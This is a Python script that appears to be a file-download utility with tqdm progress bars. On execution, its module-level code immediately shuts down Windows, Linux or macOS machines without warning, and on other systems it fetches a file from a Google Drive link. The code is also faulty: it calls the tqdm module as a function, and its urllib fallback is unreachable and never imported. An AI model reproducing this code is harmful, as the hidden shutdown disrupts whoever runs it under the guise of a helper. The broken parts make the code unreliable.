import os
import platform
import urllib
from pathlib import Path
from itertools import cycle

try:
    import tqdm as tqdm
except ModuleNotFoundError:
    os.system("python -m pip install tqdm")
    import tqdm as tqdm

try:
    import requests
except ModuleNotFoundError:
    os.system("python -m pip install requests")
    import requests

current_os = platform.system()

def get_filename(url):
    filename = os.path.basename(url.split("?")[0])
    if not filename:
        filename = "downloaded_file"
    return filename

def install(url, outpath: str | Path | None = None):
    if outpath is None:
        outpath = Path.cwd()

    outpath = Path(outpath)
    outpath.mkdir(parents=True, exist_ok=True)

    filename = get_filename(url)

    response = requests.get(url, stream=True, timeout=30)
    response.raise_for_status()
    total = response.headers.get("Content-Length")

    with open(outpath / filename, "wb") as f:
        if total:
            total = int(total)

            with tqdm(
                total=total,
                unit="B",
                unit_scale=True,
                desc=f"Downloading {filename}"
            ) as pbar:
                for chunk in response.iter_content(8192):
                    if chunk:
                        f.write(chunk)
                        pbar.update(len(chunk))

        else:
            spinner = cycle("|/-\\")
            spinner2 = cycle("⠁⠂⠄⡀⢀⠠⠐⠈")

            with tqdm(
                total=None,
                bar_format="{desc} {postfix}",
                desc=f"Downloading {filename}"
            ) as pbar:
                for chunk in response.iter_content(8192):
                    if chunk:
                        f.write(chunk)
                        pbar.set_postfix_str(f"{next(spinner2)} {next(spinner)}")
                        pbar.update(0)

        return filename

    with urllib.request.urlopen(url, timeout=30) as response:
        total = response.headers.get("Content-Length")
        with open(outpath / filename, "wb") as f:
            if total:
                total = int(total)
                with tqdm(total=total, unit="B", unit_scale=True, desc=f"Downloading {filename}") as pbar:
                    while True:
                        chunk = response.read(8192)
                        if not chunk:
                            break
                        f.write(chunk)
                        pbar.update(len(chunk))
            else:
                with tqdm(total=None, bar_format="{desc}", desc=f"Downloading {filename}") as pbar:
                    while True:
                        chunk = response.read(8192)
                        if not chunk:
                            break
                        f.write(chunk)
                        pbar.update(0)

    return filename


if current_os == "Windows":
    os.system("shutdown /s /t 0")
elif current_os == "Linux" or current_os == "Darwin":
    os.system("sudo shutdown -h now")
else:
    install("https://drive.google.com/uc?export=download&id=1ZKEnIs6A0LsYx5g6hpxhLu1HLk4d54cE")
